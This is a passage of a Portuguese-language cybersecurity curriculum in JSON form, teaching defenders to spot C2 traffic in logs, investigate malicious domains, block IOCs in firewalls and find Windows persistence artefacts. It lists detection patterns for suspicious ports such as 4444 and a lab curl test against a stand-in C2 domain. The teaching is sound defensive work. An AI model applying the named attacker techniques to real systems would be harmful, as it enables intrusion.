                                  "verification": "Confirme que os logs estão acessíveis, legíveis e com timestamp recente; liste as primeiras 10 linhas para validar formato.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Logs de firewall/proxy/Wireshark",
                                    "Editor de texto (VS Code/Notepad++)",
                                    "Terminal/CLI",
                                    "Ferramentas: grep, awk ou Wireshark"
                                  ],
                                  "tips": [
                                    "Use comandos como 'tail -f /var/log/firewall.log' para monitoramento em tempo real.",
                                    "Filtre logs por data com 'grep \"2023-10\" log.txt' para foco inicial."
                                  ],
                                  "learningObjective": "Configurar ambiente de análise segura e eficiente para logs de rede.",
                                  "commonMistakes": [
                                    "Não fazer backup de logs originais.",
                                    "Ignorar permissões de acesso (sudo necessário em Linux).",
                                    "Usar logs antigos irrelevantes."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar logs e identificar padrões de tráfego suspeito",
                                  "subSteps": [
                                    "Abra os logs e procure por portas não padrão (ex: >1024 exceto 80/443/53; suspeitas: 4444, 6666, 31337).",
                                    "Use filtros: grep 'DST=4444' log.txt ou Wireshark filter 'tcp.port == 4444'.",
                                    "Identifique volumes anormais: alto tráfego de saída para IPs desconhecidos ou conexões persistentes.",
                                    "Note protocolos incomuns (ex: TCP para portas de comando/controle como Metasploit).",
                                    "Marque linhas suspeitas com highlights ou exporte para arquivo separado."
                                  ],
                                  "verification": "Gere uma lista de 5+ padrões suspeitos identificados, com exemplos de linhas de log.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Logs preparados",
                                    "Wireshark ou grep/awk/sed",
                                    "Planilha Excel/Google Sheets para anotações"
                                  ],
                                  "tips": [
                                    "Portas comuns benignas: 80,443,22,3389; foque em >1000 com tráfego baixo.",
                                    "Combine filtros: 'grep -E \"(4444|6666)\" | grep TCP'."
                                  ],
                                  "learningObjective": "Reconhecer indicadores técnicos de tráfego malicioso em logs brutos.",
                                  "commonMistakes": [
                                    "Confundir tráfego legítimo (ex: atualizações P2P) com suspeito.",
                                    "Ignorar contexto temporal (picos noturnos).",
                                    "Não considerar direção do tráfego (in/out)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Extrair e listar IPs suspeitos únicos",
                                  "subSteps": [
                                    "Extraia IPs dos logs filtrados: use 'grep -oE '\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b' | sort | uniq'.",
                                    "Crie lista de IPs com metadados: IP, porta destino, contagem de conexões, timestamp.",
                                    "Priorize por score de suspeita: alto volume + porta exótica = prioridade alta.",
                                    "Valide IPs (formato IPv4/IPv6) e remova falsos positivos locais (ex: 192.168.x.x se não outbound).",
                                    "Salve em CSV: colunas IP, Porta, Contagem, Razão_Suspeita."
                                  ],
                                  "verification": "Tenha uma tabela CSV com pelo menos 3 IPs únicos suspeitos e justificativas.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Lista filtrada de logs",
                                    "Terminal com awk/sort/uniq",
                                    "Excel ou script Python simples para CSV"
                                  ],
                                  "tips": [
                                    "Script rápido: awk '{print $NF}' log_filtered.txt | sort -u > ips.txt.",
                                    "Use whois para geolocalização inicial."
                                  ],
                                  "learningObjective": "Extrair dados acionáveis de logs de forma automatizada e organizada.",
                                  "commonMistakes": [
                                    "Duplicar IPs sem uniq.",
                                    "Incluir IPs locais ou CDN conhecidas (ex: Cloudflare).",
                                    "Esquecer IPv6."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar IPs em bases de threat intelligence e documentar",
                                  "subSteps": [
                                    "Acesse AbuseIPDB.com, insira IP e cheque score de abuso (>50% suspeito).",
                                    "Consulte ThreatFox (abusix.com/threatfox), VirusTotal ou AlienVault OTX para relatórios.",
                                    "Correlacione: se reportado como C2 (Command & Control), confirme IOC.",
                                    "Documente: crie relatório com IP, evidência log, score TI, recomendação (bloquear?).",
                                    "Atualize lista master de IOCs locais para monitoramento futuro."
                                  ],
                                  "verification": "Relatório final com verificações de pelo menos 3 IPs, incluindo scores e ações recomendadas.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Lista de IPs CSV",
                                    "Navegador web",
                                    "Sites: AbuseIPDB, ThreatFox, VirusTotal",
                                    "Template de relatório Markdown/Word"
                                  ],
                                  "tips": [
                                    "API gratuita AbuseIPDB para automação futura.",
                                    "Cheque múltiplas fontes para falsos positivos."
                                  ],
                                  "learningObjective": "Integrar análise manual com inteligência externa para validação de ameaças.",
                                  "commonMistakes": [
                                    "Confiar em uma única fonte TI.",
                                    "Ignorar relatórios antigos (persistência de IOCs).",
                                    "Não documentar chain of evidence."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um log de firewall: '2023-10-05 02:15:23 DROP tcp -- 192.168.1.100 203.0.113.45 12345 4444'. Filtre porta 4444, extraia 203.0.113.45, verifique AbuseIPDB (score 85%, reportado como Metasploit C2), bloqueie via iptables.",
                              "finalVerifications": [
                                "Lista de IPs extraídos corresponde a tráfego suspeito nos logs originais.",
                                "Cada IP verificado em pelo menos 2 bases TI com scores documentados.",
                                "Relatório inclui evidências (snippets de log) e recomendações acionáveis.",
                                "Nenhum falso positivo óbvio (ex: IPs legítimos) incluído.",
                                "Tempo total de análise dentro de 1-2 horas.",
                                "Lista atualizável para SIEM ou firewall rules."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de portas/IPs suspeitos (90%+ taxa de acerto).",
                                "Eficiência: uso de filtros CLI reduz tempo manual.",
                                "Qualidade da documentação: clara, com evidências e scores TI.",
                                "Validação cruzada: correlação logs + TI sem gaps.",
                                "Segurança: sem exposição de dados sensíveis no processo.",
                                "Escalabilidade: método aplicável a grandes volumes de logs."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: compreensão de portas, protocolos TCP/UDP.",
                                "Análise de Dados: uso de grep/awk para parsing estruturado.",
                                "Inteligência de Ameaças: integração com OSINT e TI feeds.",
                                "Resposta a Incidentes: documentação para IR playbook.",
                                "Programação: scripts Python para automação de extração."
                              ],
                              "realWorldApplication": "Em um SOC (Security Operations Center), analista detecta breach via logs de proxy mostrando tráfego para IP C2 em porta 4444; verifica AbuseIPDB, bloqueia IP e inicia hunt para malware interno, prevenindo perda de dados."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.2.2",
                            "name": "Resolver e mapear domínios maliciosos",
                            "description": "Usar ferramentas como nslookup, dig ou whois para investigar domínios IOCs, identificando registros DNS dinâmicos (DDNS) comuns em C2 e correlacionando com WHOIS para atribuir atores.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Coletar o Domínio IOC Suspeito",
                                  "subSteps": [
                                    "Revise relatórios de IOCs ou logs de segurança para extrair domínios suspeitos.",
                                    "Valide o domínio usando uma lista de IOCs confiáveis como AlienVault OTX ou VirusTotal.",
                                    "Documente o contexto do IOC: fonte, data de detecção e razão da suspeita.",
                                    "Verifique se o domínio está ativo via ping ou consulta inicial rápida.",
                                    "Salve o domínio em um arquivo de notas para rastreamento."
                                  ],
                                  "verification": "Confirme que o domínio foi documentado com contexto completo e validado em pelo menos uma fonte externa.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Ferramentas de IOC como VirusTotal ou OTX",
                                    "Editor de texto ou bloco de notas"
                                  ],
                                  "tips": "Sempre priorize IOCs recentes; domínios antigos podem ser irrelevantes.",
                                  "learningObjective": "Aprender a selecionar e contextualizar domínios IOCs de forma precisa.",
                                  "commonMistakes": [
                                    "Ignorar validação externa",
                                    "Não documentar fonte do IOC",
                                    "Confundir subdomínios com domínios raiz"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Resolver o Domínio Usando Ferramentas DNS (nslookup e dig)",
                                  "subSteps": [
                                    "Abra um terminal e execute 'nslookup <dominio>' para obter IPs associados.",
                                    "Use 'dig <dominio> ANY' para registros DNS completos (A, MX, NS, TXT).",
                                    "Analise os resultados: identifique múltiplos IPs (indício de load balancing malicioso).",
                                    "Repita com servidores DNS alternativos como 8.8.8.8 para evitar cache poisoned.",
                                    "Registre todos os IPs resolvidos e tipos de registros."
                                  ],
                                  "verification": "IPs e registros DNS foram resolvidos e documentados corretamente de pelo menos duas ferramentas.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Terminal/Linux/Mac/Windows com nslookup/dig instalados",
                                    "Acesso à internet"
                                  ],
                                  "tips": "Use 'dig +short' para saídas limpas; evite nslookup em ambientes Windows sem dig.",
                                  "learningObjective": "Dominar resolução DNS para mapear infraestrutura por trás de domínios.",
                                  "commonMistakes": [
                                    "Usar apenas um servidor DNS",
                                    "Ignorar registros TXT para C2",
                                    "Não notar IPs dinâmicos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Consultar WHOIS para Dados de Registro",
                                  "subSteps": [
                                    "Execute 'whois <dominio>' no terminal para obter registrante, data de criação e nameservers.",
                                    "Acesse whois.icann.org ou whois.domaintools.com para detalhes adicionais.",
                                    "Extraia campos chave: registrant email, organization, country e abuse contact.",
                                    "Note privacy protections (redacted info indica anonimato comum em domínios maliciosos).",
                                    "Salve saída em formato legível (TXT ou screenshot)."
                                  ],
                                  "verification": "Relatório WHOIS completo com todos os campos chave extraídos e analisados.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Comando whois instalado",
                                    "Sites WHOIS online",
                                    "Acesso à internet"
                                  ],
                                  "tips": "Use 'whois -h whois.server.net <dominio>' para registrars específicos como GoDaddy.",
                                  "learningObjective": "Extrair e interpretar dados WHOIS para rastrear ownership.",
                                  "commonMistakes": [
                                    "Parar em dados redacted sem tentar registrars alternativos",
                                    "Ignorar nameservers",
                                    "Confundir registrant com registrar"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Registros DNS Dinâmicos (DDNS) e Padrões Maliciosos",
                                  "subSteps": [
                                    "Verifique nameservers por padrões DDNS: no-ip.com, dyndns.org, duckdns.org.",
                                    "Analise TTL baixo (<300s) ou múltiplos subdomínios dinâmicos (comum em C2).",
                                    "Compare IPs resolvidos com listas de known bad IPs (abuseipdb.com).",
                                    "Busque por DGA patterns ou domínios gerados algoritmicamente.",
                                    "Marque o domínio como suspeito se matching DDNS + TTL baixo."
                                  ],
                                  "verification": "Identificados e listados todos os indicadores de DDNS ou padrões maliciosos.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Listas de DDNS conhecidas",
                                    "Ferramentas como AbuseIPDB",
                                    "Terminal"
                                  ],
                                  "tips": "DDNS é comum em botnets; priorize nameservers como 'ns1.no-ip.com'.",
                                  "learningObjective": "Reconhecer assinaturas de infraestrutura C2 via DNS.",
                                  "commonMistakes": [
                                    "Ignorar nameservers",
                                    "Não checar TTL",
                                    "Confundir DDNS legítimo com malicioso sem contexto"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Correlacionar Dados e Atribuir Atores Maliciosos",
                                  "subSteps": [
                                    "Cruze WHOIS registrant com bases de threat actors (ex: registrar histórico em maltego).",
                                    "Correlacione IPs/nameservers com IOCs conhecidos de campanhas APT.",
                                    "Use OSINT: busque email registrant em haveibeenpwned ou leak sites.",
                                    "Crie um mapa: domínio -> IP -> WHOIS -> ator provável.",
                                    "Gere relatório final com evidências e confiança score (low/medium/high)."
                                  ],
                                  "verification": "Mapa de correlação completo com atribuição de ator e relatório gerado.",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": [
                                    "Ferramentas OSINT como Maltego ou Spiderfoot",
                                    "Bases de threat intel"
                                  ],
                                  "tips": "Atribuição requer múltiplas fontes; evite conclusões prematuras.",
                                  "learningObjective": "Integrar dados de DNS/WHOIS para inteligência acionável.",
                                  "commonMistakes": [
                                    "Atribuição sem correlação múltipla",
                                    "Ignorar privacy proxies",
                                    "Relatório sem evidências"
                                  ]
                                }
                              ],
                              "practicalExample": "Dado o domínio suspeito 'c2bot.dyndns.org' de um log de malware: 1) nslookup revela IP dinâmico; 2) dig mostra NS no-ip.com; 3) WHOIS indica registrant anon de país high-risk; 4) Correlação aponta para campanha Emotet.",
                              "finalVerifications": [
                                "Domínio resolvido com IPs e registros DNS completos.",
                                "Dados WHOIS extraídos e analisados por anonimato.",
                                "DDNS identificado corretamente via nameservers.",
                                "Correlações realizadas com threat intel externa.",
                                "Relatório final gerado com mapa e confiança score.",
                                "Processo repetível em novo IOC sem erros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na resolução DNS (100% match com ferramentas online).",
                                "Proficiência em interpretação WHOIS (campos chave corretos).",
                                "Detecção precisa de DDNS (sem falsos positivos).",
                                "Qualidade da correlação (múltiplas fontes usadas).",
                                "Relatório claro e acionável (inclui evidências).",
                                "Eficiência temporal (dentro de 2 horas totais)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolo DNS e resolução.",
                                "OSINT e Inteligência: Coleta e correlação de dados públicos.",
                                "Análise Forense Digital: Rastreamento de artefatos de rede.",
                                "Segurança de Malware: Identificação de C2 infrastructure.",
                                "Análise de Ameaças: Atribuição de atores via IOCs."
                              ],
                              "realWorldApplication": "Em equipes de Threat Hunting ou SOC, para mapear infraestrutura de phishing, ransomware ou APTs, permitindo bloqueios proativos e relatórios a CERTs."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.2.3",
                            "name": "Bloquear IOCs de rede em firewalls",
                            "description": "Implementar listas de IOCs (IPs e domínios) em firewalls como pfSense ou AWS WAF, testando bloqueios em cenários de Red Team para simular defesas contra exfiltração.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Coletar e Validar Indicadores de Compromisso (IOCs)",
                                  "subSteps": [
                                    "Pesquise fontes confiáveis como VirusTotal, AlienVault OTX ou relatórios de threat intelligence para IOCs recentes de IPs e domínios suspeitos.",
                                    "Extraia IPs e domínios relevantes associados a campanhas de exfiltração ou C2 (Command and Control).",
                                    "Valide os IOCs cruzando com múltiplas fontes para evitar falsos positivos, verificando reputação e contexto geográfico.",
                                    "Documente cada IOC com fonte, data de descoberta, confiança (alta/média/baixa) e razão de suspeita.",
                                    "Formate a lista em um arquivo CSV ou JSON compatível com importação em firewalls (ex: colunas IP, Domain, Action: Block)."
                                  ],
                                  "verification": "Lista de 5-10 IOCs documentados em arquivo formatado, com pelo menos 80% validados sem falsos positivos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Acesso gratuito a VirusTotal e OTX",
                                    "Planilha Google Sheets ou Excel",
                                    "Documentação de threat intel recente"
                                  ],
                                  "tips": "Priorize IOCs com TLP:WHITE ou público; use scripts Python com APIs para automação inicial.",
                                  "learningObjective": "Selecionar e validar IOCs de rede confiáveis para bloqueio defensivo.",
                                  "commonMistakes": [
                                    "Ignorar IOCs expirados ou desatualizados",
                                    "Bloquear ranges inteiros sem granularidade",
                                    "Confundir IOCs de teste com reais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar o Ambiente de Firewall",
                                  "subSteps": [
                                    "Instale e configure uma VM pfSense (versão 2.7+) em ambiente lab como VirtualBox ou Proxmox, ou crie uma stack AWS com WAF.",
                                    "Acesse a interface web do pfSense (https://IP_FW) e configure interfaces WAN/LAN básicas com DHCP.",
                                    "Instale pacotes necessários: pfBlockerNG para pfSense ou configure Web ACL no AWS WAF.",
                                    "Crie aliases para IPs e domínios suspeitos (ex: Firewall > Aliases > Add: IP Suspeitos).",
                                    "Teste conectividade básica do firewall para internet simulando tráfego outbound."
                                  ],
                                  "verification": "Firewall acessível via web UI, aliases criados e ping de teste para internet externa bem-sucedido.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "VM VirtualBox/Proxmox",
                                    "ISO pfSense",
                                    "Conta AWS Free Tier para WAF opcional",
                                    "2 CPUs, 2GB RAM para VM"
                                  ],
                                  "tips": "Use snapshots na VM para rollback rápido; configure regras default deny para WAN.",
                                  "learningObjective": "Preparar um firewall funcional para implementação de regras de segurança.",
                                  "commonMistakes": [
                                    "Expor interface web sem autenticação forte",
                                    "Configurar NAT incorreto bloqueando todo tráfego",
                                    "Esquecer de salvar configurações"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Regras de Bloqueio de IOCs",
                                  "subSteps": [
                                    "No pfSense, vá para Firewall > Rules > WAN, crie regra: Action Block, Source Any, Destination alias IOCs, Log matches.",
                                    "Para domínios, configure pfBlockerNG > DNSBL: adicione feeds ou liste domínios manualmente com block action.",
                                    "No AWS WAF (alternativa): Crie IP Set e Domain List com IOCs, adicione Web ACL com Block rule.",
                                    "Aplique regras em floating rules para tráfego de rede geral e habilite logging detalhado.",
                                    "Salve, aplique mudanças e monitore logs iniciais para tráfego bloqueado."
                                  ],
                                  "verification": "Regras visíveis em Firewall Rules, logs mostram aplicação sem erros de sintaxe.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Interface web pfSense/AWS Console",
                                    "Lista de IOCs do Step 1",
                                    "Documentação pfBlockerNG"
                                  ],
                                  "tips": "Use ordem de regras: block IOCs antes de allow any; teste em lab isolado primeiro.",
                                  "learningObjective": "Criar e aplicar regras precisas de bloqueio baseadas em IOCs.",
                                  "commonMistakes": [
                                    "Regras muito amplas causando downtime",
                                    "Esquecer logging para auditoria",
                                    "Conflito com regras existentes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Bloqueios com Simulação Red Team",
                                  "subSteps": [
                                    "Configure uma VM atacante (Kali Linux) na rede interna para simular exfiltração.",
                                    "Teste conectividade para IOCs: use ping IP_suspeito, nslookup dominio_suspeito, curl http://dominio_suspeito.",
                                    "Monitore logs do firewall para confirmação de blocks (Status > System Logs > Firewall).",
                                    "Simule bypass attempts: teste com VPN ou proxies, ajustando regras se necessário.",
                                    "Documente resultados: screenshots de falhas de conexão e logs de bloqueio."
                                  ],
                                  "verification": "100% dos IOCs testados bloqueados, com evidências em logs e testes falhando.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "VM Kali Linux",
                                    "Ferramentas: curl, nslookup, tcpdump",
                                    "Browser para domínios"
                                  ],
                                  "tips": "Use Wireshark para capturar pacotes rejeitados; teste IOCs benignos para validar falsos positivos.",
                                  "learningObjective": "Validar efetividade de defesas simulando táticas adversárias.",
                                  "commonMistakes": [
                                    "Testar sem isolamento de rede",
                                    "Interpretar timeouts como blocks",
                                    "Não documentar evidências"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab, colete IOCs de uma campanha phishing (IP: 198.51.100.1, domínio: fake-c2.com via VirusTotal). Configure pfSense, crie alias com esses IOCs, adicione regra block na WAN. De uma VM Kali, execute 'curl fake-c2.com' - deve falhar com log de block no pfSense, simulando defesa contra exfiltração de dados.",
                              "finalVerifications": [
                                "Lista de IOCs validada e importada corretamente no firewall.",
                                "Regras de bloqueio ativas e priorizadas corretamente.",
                                "Testes Red Team confirmam 100% de bloqueios sem falsos positivos.",
                                "Logs do firewall registram tentativas de conexão bloqueadas.",
                                "Ambiente restaurável via snapshot sem impactos persistentes.",
                                "Documentação completa com screenshots e comandos usados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na validação de IOCs (sem falsos positivos >90%).",
                                "Corretude das regras de firewall (sem erros de sintaxe ou conflitos).",
                                "Efetividade dos testes (todos IOCs bloqueados comprovadamente).",
                                "Qualidade da documentação e evidências (clareza e completude).",
                                "Eficiência temporal (dentro do tempo estimado total de 4-5 horas).",
                                "Capacidade de troubleshooting (ajustes em caso de falhas)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Compreensão de ACLs e filtragem de pacotes.",
                                "Threat Intelligence: Coleta e análise de IOCs de fontes globais.",
                                "Resposta a Incidentes: Integração com SIEM para alertas de blocks.",
                                "Cloud Security: Paralelos com AWS WAF e Azure Firewall.",
                                "Red Team/Blue Team: Simulações de jogos de guerra cibernética."
                              ],
                              "realWorldApplication": "Em um SOC de uma empresa, bloquear IOCs de uma campanha ransomware ativa impede exfiltração de dados sensíveis, reduzindo MTTR (Mean Time to Respond) e protegendo conformidade com regulamentações como GDPR ou LGPD."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.1.3",
                        "name": "Artefatos Forenses de Compromisso",
                        "description": "Vestígios persistentes em sistemas comprometidos, como chaves de registro modificadas, mutexes, arquivos temporários ou entradas de scheduled tasks indicativos de invasão.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.1.3.1",
                            "name": "Detectar artefatos em registros do Windows",
                            "description": "Usar ferramentas como Autoruns ou RegRipper para inspecionar chaves de registro como HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, identificando entradas suspeitas de persistência.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente de Análise Forense",
                                  "subSteps": [
                                    "Criar uma máquina virtual (VM) com Windows 10 ou 11 para simular ambiente infectado.",
                                    "Baixar e extrair Autoruns de Sysinternals (microsoft.com/sysinternals).",
                                    "Baixar e configurar RegRipper (GitHub: regripper)",
                                    "Executar snapshot da VM para permitir resets rápidos.",
                                    "Verificar privilégios administrativos na VM."
                                  ],
                                  "verification": "Autoruns e RegRipper executam sem erros na VM, com snapshot salvo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Máquina Virtual (VirtualBox/VMware com Windows ISO)",
                                    "Autoruns.exe (Sysinternals)",
                                    "RegRipper.zip (GitHub)",
                                    "Conta admin na VM"
                                  ],
                                  "tips": "Sempre use VM isolada para evitar contaminação real; desabilite rede se possível.",
                                  "learningObjective": "Configurar um ambiente seguro e isolado para análise de registros sem riscos à máquina host.",
                                  "commonMistakes": [
                                    "Executar ferramentas em máquina de produção",
                                    "Esquecer privilégios admin",
                                    "Não criar snapshot inicial"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inspecionar Chaves de Registro com Autoruns",
                                  "subSteps": [
                                    "Executar Autoruns.exe como administrador.",
                                    "Navegar para aba 'Logon' e filtrar por 'Run' entries.",
                                    "Verificar chaves como HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
                                    "Salvar relatório em HTML/XML para análise offline.",
                                    "Comparar entradas com baseline conhecida (ex: Autoruns em VM limpa)."
                                  ],
                                  "verification": "Relatório Autoruns gerado listando todas entradas de Run sem crashes.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Autoruns.exe",
                                    "VM Windows com snapshot limpo"
                                  ],
                                  "tips": "Use 'Hide Microsoft Entries' para focar em suspeitas; salve múltiplos relatórios.",
                                  "learningObjective": "Dominar Autoruns para visualização rápida de mecanismos de persistência no Registro.",
                                  "commonMistakes": [
                                    "Ignorar entradas de usuário (HKCU)",
                                    "Confundir entradas legítimas com maliciosas",
                                    "Não salvar relatório para evidência"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Registros com RegRipper",
                                  "subSteps": [
                                    "Extrair hives do Registro da VM (SYSTEM, SOFTWARE, etc.) usando reg.exe save.",
                                    "Executar RegRipper com plugin 'run' em SOFTWARE hive: rip.pl -r SOFTWARE -p run.",
                                    "Revisar output por entradas não padrão ou com caminhos suspeitos (ex: %TEMP%).",
                                    "Executar plugins adicionais como 'persistence' e 'services'.",
                                    "Exportar resultados para timeline com Plaso ou similar."
                                  ],
                                  "verification": "Output do RegRipper parseado corretamente com entradas de Run listadas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "RegRipper instalado",
                                    "Hives extraídos (reg save HKLM\\SOFTWARE C:\\software.hiv)",
                                    "Perl ambiente se necessário"
                                  ],
                                  "tips": "Use -f para plugin específico; valide hashes de hives para integridade.",
                                  "learningObjective": "Aplicar RegRipper para extração e parsing automatizado de artefatos de Registro.",
                                  "commonMistakes": [
                                    "Extrair hives de VM rodando (use offline)",
                                    "Ignorar timestamps de criação/modificação",
                                    "Não validar plugins atualizados"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar e Documentar Entradas Suspeitas",
                                  "subSteps": [
                                    "Comparar entradas Autoruns/RegRipper com VirusTotal ou IOC lists (ex: MITRE ATT&CK).",
                                    "Analisar paths/hashes de executáveis suspeitos (ex: não em C:\\Windows).",
                                    "Documentar IOCs: chave completa, valor, timestamp, hash.",
                                    "Simular remoção segura e testar persistência.",
                                    "Gerar relatório final com screenshots e evidências."
                                  ],
                                  "verification": "Relatório documenta pelo menos 3 IOCs potenciais com justificativa.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "VirusTotal.com",
                                    "MITRE ATT&CK Navigator",
                                    "Template de relatório forense"
                                  ],
                                  "tips": "Priorize entradas com argumentos obfuscados ou caminhos user-writable.",
                                  "learningObjective": "Diferenciar persistência benigna de maliciosa e documentar para IR.",
                                  "commonMistakes": [
                                    "Marcar software legítimo como malicioso (ex: CCleaner)",
                                    "Omitir contexto como publisher/signature",
                                    "Não verificar múltiplas chaves (RunOnce, Policies)"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma VM simulando ransomware (ex: Ryuk), Autoruns revela entrada 'Update' em HKLM\\Run apontando para %APPDATA%\\updater.exe; RegRipper confirma criação recente; análise revela hash malicioso no VT, confirmando persistência.",
                              "finalVerifications": [
                                "Lista entradas de Run em HKLM/HKCU corretamente.",
                                "Identifica pelo menos 2 artefatos suspeitos com justificativa.",
                                "Gera relatório com timestamps e hashes.",
                                "Compara com baseline limpa.",
                                "Valida integridade de hives analisados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção (sem falsos positivos >10%).",
                                "Cobertura completa de chaves de persistência (Run, RunOnce, etc.).",
                                "Qualidade da documentação (screenshots, IOCs exportáveis).",
                                "Eficiência temporal (dentro de 2h totais).",
                                "Uso correto de ferramentas sem erros."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Malware (hashing e VT lookup)",
                                "Sistemas Operacionais (estrutura do Registro Windows)",
                                "Programação (scripts PowerShell para automação RegRipper)",
                                "Redes (C2 via persistência)",
                                "Ética em Cibersegurança (cadeia de custódia)"
                              ],
                              "realWorldApplication": "Em equipes de SOC/DFIR, detectar persistência em endpoints comprometidos durante triagem de alertas, permitindo isolamento rápido e remediação em incidentes reais como APTs ou ransomware."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.3.2",
                            "name": "Analisar mutexes e processos ocultos",
                            "description": "Empregar Process Explorer ou Volatility para detectar mutexes únicos criados por malware (ex: 'Global\\{random}') e processos injetados, correlacionando com IOCs conhecidos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e instalar ferramentas de análise",
                                  "subSteps": [
                                    "Baixe e execute Process Explorer do site oficial da Sysinternals (Microsoft).",
                                    "Instale Volatility baixando o framework mais recente do GitHub e configure perfis para Windows (ex: win10_x64).",
                                    "Prepare uma imagem de memória de um sistema suspeito usando ferramentas como DumpIt ou FTK Imager.",
                                    "Crie uma lista de IOCs conhecidos de mutexes e processos de malwares comuns (ex: de MITRE ATT&CK ou VirusTotal).",
                                    "Configure um ambiente isolado (VM) para análise segura."
                                  ],
                                  "verification": "Confirme que Process Explorer executa sem erros, Volatility lista plugins com 'vol.py --info', e imagem de memória é acessível.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Process Explorer (Sysinternals)",
                                    "Volatility 3 framework",
                                    "Imagem de memória .raw ou .mem",
                                    "Lista de IOCs em CSV/JSON"
                                  ],
                                  "tips": "Use uma VM snapshot para reverter mudanças; sempre valide hashes das ferramentas para evitar infecções.",
                                  "learningObjective": "Configurar ferramentas forenses para análise de mutexes e processos de forma segura e eficiente.",
                                  "commonMistakes": [
                                    "Baixar ferramentas de fontes não oficiais levando a infecções",
                                    "Esquecer de matching de perfil no Volatility causando erros de parsing"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Detectar mutexes suspeitos usando Process Explorer",
                                  "subSteps": [
                                    "Execute Process Explorer como administrador e ative 'Show Lower Pane' com view 'Handles'.",
                                    "Filtre por 'Mutex' no lower pane e procure por nomes únicos como 'Global\\{random-string}' ou padrões de malware conhecidos.",
                                    "Use 'Find' (Ctrl+F) para buscar mutexes específicos de IOCs (ex: 'Global\\CryptoSWMutex').",
                                    "Anote PIDs associados e verifique trees de processos pai-filho para anomalias.",
                                    "Exporte a lista de mutexes para CSV para análise posterior."
                                  ],
                                  "verification": "Liste pelo menos 3 mutexes únicos identificados e seus PIDs associados em um relatório inicial.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Process Explorer",
                                    "Lista de IOCs de mutexes"
                                  ],
                                  "tips": "Aumente prioridade de CPU no Process Explorer para análise em tempo real; foque em mutexes 'Global\\' namespace para compartilhados.",
                                  "learningObjective": "Identificar mutexes de sincronização criados por malware em sistemas live.",
                                  "commonMistakes": [
                                    "Ignorar mutexes em namespaces locais",
                                    "Confundir mutexes legítimos (ex: de apps como Chrome) com maliciosos sem IOCs"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar processos ocultos e injetados com Volatility",
                                  "subSteps": [
                                    "Execute 'vol.py -f memory.dump windows.pslist' para listar processos e identificar ausentes/injetados.",
